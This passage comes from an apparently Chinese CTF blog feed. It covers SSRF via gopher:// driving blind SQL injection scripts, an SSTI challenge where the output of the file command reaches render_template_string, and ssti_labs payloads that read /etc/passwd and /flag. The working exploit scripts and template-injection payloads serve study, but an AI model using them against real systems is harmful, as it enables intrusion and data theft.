class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;http://192.168.150.1:43083/curl.php&quot;</span><br>database = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<span class="hljs-comment">#判断数据库名第i个字符的ascii码是否为j，是的话为真会返回&quot;meow&quot;</span><br>        content = content.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;/**/&quot;</span>)<span class="hljs-comment">#SQL页面存在空格过滤用/**/绕过</span><br>        content_length = <span class="hljs-built_in">len</span>(content)<br>        data = \<br><span class="hljs-string">f&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;content_length&#125;</span></span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string"><span class="hljs-subst">&#123;content&#125;</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>        result = urllib.parse.quote(data)<br>        result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>        payload = <span class="hljs-string">&quot;gopher://127.0.0.1:80/_&quot;</span>+result<br>        r = requests.post(url,data=&#123;<span class="hljs-string">&quot;url&quot;</span>:payload&#125;).text<br>        <span class="hljs-comment">#print(r)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;meow&quot;</span> <span class="hljs-keyword">in</span> r:<br>            database += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(database)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#r</span><br><span class="hljs-comment">#ru</span><br><span class="hljs-comment">#rua</span><br><span class="hljs-comment">#数据库名为rua</span><br></code></pre></td></tr></table></figure><p>同样，爆表名，因为可能存在多个表，所以使用<code>group_concat()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<br>        ...........<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#f</span><br><span class="hljs-comment">#fl</span><br><span class="hljs-comment">#fla</span><br><span class="hljs-comment">#flag</span><br><span class="hljs-comment">#flag,</span><br><span class="hljs-comment">#flag,m</span><br><span class="hljs-comment">#flag,me</span><br><span class="hljs-comment">#flag,mes</span><br><span class="hljs-comment">#flag,mess</span><br><span class="hljs-comment">#flag,messa</span><br><span class="hljs-comment">#flag,messag</span><br><span class="hljs-comment">#flag,message</span><br><span class="hljs-comment">#flag,messages</span><br></code></pre></td></tr></table></figure><p>盲猜flag在flag表里，爆字段名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;flag&#x27;),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<span class="hljs-comment">#爆字段名</span><br>        ...........<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#f</span><br><span class="hljs-comment">#fl</span><br><span class="hljs-comment">#fla</span><br><span class="hljs-comment">#flag</span><br></code></pre></td></tr></table></figure><p>已知信息：</p><p>数据库rua、表flag、字段flag，爆flag内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr((select group_concat(flag) from flag),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<span class="hljs-comment">#爆flag表内容</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SSRF/image-20230412103314980.png"></p><p>拿到flag，本题还可以用二分法优化算法，附上L1ao学长的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fuck</span>():<br>    url = <span class="hljs-string">&quot;http://192.168.150.1:43083/curl.php&quot;</span><br>    result=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1290</span>):<br>        head=<span class="hljs-number">32</span><br>        tail=<span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> head&lt;tail:<br>            mid=(head+tail)&gt;&gt;<span class="hljs-number">1</span><br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((seleCt(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;rua&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;flag&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((seLect(flag)from(rua.flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            <span class="hljs-built_in">id</span> = urllib.parse.quote(sqli)<br>            id_length = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">id</span>)+<span class="hljs-number">3</span><br>            payload = <span class="hljs-string">f&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;id_length&#125;</span></span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string">id=<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>            <span class="hljs-comment"># print(payload)</span><br>            tmp = urllib.parse.quote(payload)<br>            new = tmp.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>            res = <span class="hljs-string">&#x27;gopher://127.0.0.1:80/_&#x27;</span> + new<br>            dataa = &#123;<br>                <span class="hljs-string">&quot;url&quot;</span>:res<br>            &#125;<br>            r = requests.post(url=url,data=dataa)<br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;meow meow meow&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>                head=mid+<span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                tail=mid<br>        <span class="hljs-keyword">if</span> head !=<span class="hljs-number">32</span>:<br>            result+=<span class="hljs-built_in">chr</span>(head)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span>   <br>        <span class="hljs-built_in">print</span>(result)<br>fuck()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>常见漏洞</category>
      
      <category>Web漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>ssrf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSTI</title>
    <link href="/2023/02/09/ssti/"/>
    <url>/2023/02/09/ssti/</url>
    
    <content type="html"><![CDATA[<h2 id="2023FCTF热身赛filechecker-mini"><a href="#2023FCTF热身赛filechecker-mini" class="headerlink" title="2023FCTF热身赛filechecker_mini"></a>2023FCTF热身赛filechecker_mini</h2><p>打开题目，让我们上传一个文件：</p><p><img src="/2023/02/09/ssti/image-20230429032204160.png"></p><p>桌面上随便丢了个php文件进去提交看看会有啥情况：</p><p><img src="/2023/02/09/ssti/image-20230429032353870.png"></p><p>判断文件类型，(MIME绕过预定)</p><p>附件下载下来先看源码：</p><p>index.html：</p><p><img src="/2023/02/09/ssti/image-20230429030651913.png"></p><p>可以看出该网页使用模块渲染将result值渲染进index对应位置，那么就看下后端代码app.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, render_template_string<br><span class="hljs-keyword">from</span> waitress <span class="hljs-keyword">import</span> serve<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><br>app_dir = os.path.split(os.path.realpath(__file__))[<span class="hljs-number">0</span>]<br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;app_dir&#125;</span>/upload/&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>,result=<span class="hljs-string">&quot;ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿&quot;</span>)<br><br>        <span class="hljs-keyword">elif</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>            f = request.files[<span class="hljs-string">&#x27;file-upload&#x27;</span>]<br>            filepath = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], f.filename)<br><br>            <span class="hljs-keyword">if</span> os.path.exists(filepath) <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;..&quot;</span> <span class="hljs-keyword">in</span> filepath:<br>                <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, result=<span class="hljs-string">&quot;Don&#x27;t (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                f.save(filepath)<br>                file_check_res = subprocess.check_output(<br>                    [<span class="hljs-string">&quot;/bin/file&quot;</span>, <span class="hljs-string">&quot;-b&quot;</span>, filepath], <br>                    shell=<span class="hljs-literal">False</span>, <br>                    encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>,<br>                    timeout=<span class="hljs-number">1</span><br>                )<br>                os.remove(filepath)<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;empty&quot;</span> <span class="hljs-keyword">in</span> file_check_res <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;cannot open&quot;</span> <span class="hljs-keyword">in</span> file_check_res:<br>                    file_check_res=<span class="hljs-string">&quot;wafxixi ฅ•ω•ฅ ฅ•ω•ฅ ฅ•ω•ฅ&quot;</span><br>                <span class="hljs-keyword">return</span> render_template_string(file_check_res)<br><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, result=<span class="hljs-string">&#x27;Error ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    serve(app, host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">3000</span>, threads=<span class="hljs-number">1000</span>, cleanup_interval=<span class="hljs-number">30</span>)<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/ssti/image-20230429032742576.png"></p><p>上面大家都用<code>render_template()</code>就你爱用<code>render_template_string()</code>是吧（指指点点，一眼模板注入，那么我们就希望<code>file_check_res</code>里有我们能够执行的rce代码。<code>file_check_res</code>哪来的？倒退往上看。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">f.save(filepath)<br>file_check_res = subprocess.check_output(<br>[<span class="hljs-string">&quot;/bin/file&quot;</span>, <span class="hljs-string">&quot;-b&quot;</span>, filepath], <br>shell=<span class="hljs-literal">False</span>, <br>encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>,<br>imeout=<span class="hljs-number">1</span><br>)<br>os.remove(filepath)<br></code></pre></td></tr></table></figure><p>先保存filepath这样一个文件，<code>subprocess.check_output(command)</code>返回Linux命令行输出，然后再把filepath文件删除，那么这里的<code>file_check_res</code>就是<code>file -b &#123;filepath&#125;</code>的结果。往上看filepath其实就是将上传文件目录的绝对路径和该文件的文件名拼接起来来标定用户上传的这个文件在容器中的绝对位置。逻辑搞明白了，现在的重点就在于如何对一个文件使用<code>file -b</code> 命令后返回值中能回显我们所期望的值。动手操作下flie命令，发现其不会输出文件的内容只会输出其类型，</p><p><img src="/2023/02/09/ssti/image-20230429034451879.png"></p><p>代码中的-b参数作用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">-b 　#列出辨识结果时，不显示文件名称。<br></code></pre></td></tr></table></figure><p>所以在文件名上动手脚的想法也破灭了（悲。</p><p>卡住了，向大佬博客寻求帮助，去guthub查找file命令源码。第一个仓库点开。<img src="/2023/02/09/ssti/image-20230429191534591.png"></p><p>点开tests里面是各种针对该<code>file</code>命令的<a href="https://github.com/file/file/tree/master/tests">测试结果</a></p><p><img src="/2023/02/09/ssti/image-20230429191635511.png"></p><p>这8个分别分别是在文本中写入bash脚本的4种情况和对应的用<code>file</code>命令执行的输出结果，可以看出如果文本内容为<code>#!/usr/bin</code>开头的那么输出结果中会显示文本中的其他内容。</p><p><img src="/2023/02/09/ssti/image-20230429191927593.png"></p><p>本地做测试：创建一个文本文件修改内容如下</p><p><img src="/2023/02/09/ssti/image-20230429193849800.png"></p><p>测试结果如下：</p><p><img src="/2023/02/09/ssti/image-20230429193915755.png"></p><p>显而易见，输出可控，可以进行模板渲染。新建一个文本文件内容如下，上传文件</p><p><img src="/2023/02/09/ssti/image-20230429194117415.png"></p><p><img src="/2023/02/09/ssti/image-20230429194209528.png"></p><p>存在ssti漏洞，开始利用，调用os模块</p><p><img src="/2023/02/09/ssti/image-20230429195640928.png"></p><p><img src="/2023/02/09/ssti/image-20230429195803084.png"></p><p>调用popen()方法。</p><p><img src="/2023/02/09/ssti/image-20230429195958840.png"></p><p>上传文件，获取flag。</p><hr><h2 id="ssti-labs"><a href="#ssti-labs" class="headerlink" title="ssti_labs"></a>ssti_labs</h2><p>搭建踩的坑：</p><p>pip python 还有各种库版本之间的冲突，我pip和python全用的3，python版本是3.8。出现ImportError错误导致无法导入’soft_unicode’模块是由于markupsafe库的版本引起的，在py3.8中markupsafe库中的soft_unicode模块被移除，先升级injja2和markupsafe库到最新版本确保它们和python3.8兼容，<code>pip install --upgrade jijna2markupsafe</code>。还有itsdangerous库中的json模块也被移除，同上，<code>pip install --upgrade itsdangerous</code>，然后还是不行，是由于flask和itsdangerous版本之间的兼容性问题，将flask和itsdangerous降级到与py3.8兼容的较旧版本<code>pip install flask==1.1.4 itsdangerous==1.1.0</code>，成功部署完之后，又遇到问题，运行<code>python3 app.py</code>后，显示<code>* Running on http://127.0.0.1:5001/ (Press CTRL+C to quit)</code>但是却无法通过公网ip访问到。gpt debug，默认情况下flask只会绑定到回环地址，没法绑定到公网ip，所以无法外部访问，最后一行改成<code>app.run(host=&#39;0.0.0.0&#39;,port=5001,debug=&#39;True&#39;)</code>，然后就是，千万别用root跑(悲)，不然会被日的很惨(感谢L1ao学长的指出)，当然就算创建新用户跑，也面临着提权被干的风险，所以，最好还是用容器吧，还学了点别的小知识</p><p><code>kill -9 PID</code>：强制kill进程</p><p><code>adduser your_username</code>：在服务器上创建一个普通用户</p><p><code>chown your_username:your_username app.py</code>：将app.py的所有权转移到普通用户</p><p><code>su - your_username</code>：用普通用户身份登录</p><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>漏洞存在</p><p><img src="/2023/02/09/ssti/image-20230730212602385.png"></p><p><code>__class__</code>一个对象的类的引用，用于实例化对象，这里是字符串对象，<code>obj.__class__</code>返回该对象所属类，对于类本身，<code>Class.__class__</code>返回它的元类<img src="/2023/02/09/ssti/image-20230730212648721.png"></p><p>当前类的基类，这里有三种获取方法，<code>__base__</code>(获取直接父类)，<code>__bases__</code>(<code>Class.__bases__</code>返回Class的元组，包含它的直接父类)，<code>__mro__</code>，<code>__mro__</code>方法返回一个类的方法解析顺序，但是要注意获取到的基类是元组(多个)还是单个，下面使用<code>__subclasses__()</code>时要注意的</p><p><img src="/2023/02/09/ssti/image-20230730212858437.png"></p><p><img src="/2023/02/09/ssti/image-20230730213654861.png"></p><p><img src="/2023/02/09/ssti/image-20230730213714396.png"></p><p>有这些类继承的方法，我们就可以从任何一个变量(字符串、数组，整型，配置(config)，甚至文件本身(self)等等)，回溯到最顶层基类（<code>&lt;class&#39;object&#39;&gt;</code>）中去，再获得到此基类所有实现的类，就可以获得到很多的类和方法了。</p><p><code>__subclasses__()</code>方法，直接返回一个类的所有子类列表，我们已经在最顶层基类了，看<code>&lt;class&#39;object&#39;&gt;</code>下有哪些子类，很多，SSTI 的主要目的就是从这么多的子类中找出可以利用的类（一般是指读写文件或执行命令的类）加以利用。</p><p><img src="/2023/02/09/ssti/image-20230730215716944.png"></p><p>可通过角标查看<img src="/2023/02/09/ssti/image-20230730215805610.png"></p><p>，在python2中，子类file类可直接用于读取文件：</p><p>编写脚本寻找file类对应角标：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> html<span class="hljs-comment">#这里引入了html库是针对本题，运行返回网页内容是html实体，所以人为解码</span><br><br>url = <span class="hljs-string">&#x27;http://124.70.99.199:5001/level/1&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">300</span>):<br>    payload = <span class="hljs-string">&quot;&quot;&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[%s]&#125;&#125;&quot;&quot;&quot;</span>%i<br><br>    r = requests.post(url,data=&#123;<span class="hljs-string">&quot;code&quot;</span>:payload&#125;).text<br>    r = html.unescape(r)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;file&quot;</span> <span class="hljs-keyword">in</span> r:<br><br>        <span class="hljs-built_in">print</span>(i)<br>        <br><span class="hljs-comment">#这里假设寻找到file类位于50位</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="hljs-number">50</span>](<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>但是现在基本上都用py3，包括我的靶场，所以有另外一种读文件方式，我们可以用<code>&lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;</code> 这个类去读取文件。微调脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> html<span class="hljs-comment">#这里引入了html库是针对本题，运行返回网页内容是html实体，所以人为解码</span><br><br>url = <span class="hljs-string">&#x27;http://124.70.99.199:5001/level/1&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">300</span>):<br>    payload = <span class="hljs-string">&quot;&quot;&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[%s]&#125;&#125;&quot;&quot;&quot;</span>%i<br><br>    r = requests.post(url,data=&#123;<span class="hljs-string">&quot;code&quot;</span>:payload&#125;).text<br>    r = html.unescape(r)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;FileLoader&quot;</span> <span class="hljs-keyword">in</span> r:<br><br>        <span class="hljs-built_in">print</span>(i)<br>        <br><span class="hljs-comment">#这里寻找到file类位于79下标</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/ssti/image-20230730225207888.png"></p><p><code>get_data</code>方法读文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">79</span>][<span class="hljs-string">&quot;get_data&quot;</span>](<span class="hljs-number">0</span>,<span class="hljs-string">&quot;/flag&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/ssti/image-20230730233526240.png"></p><p>玩点更有意思的，getshell</p><p>内建函数：</p><p>在python解释器启动时，即使没有创建任何变量或函数，无需导入任何模块，有很多函数可以使用，叫做内建函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span 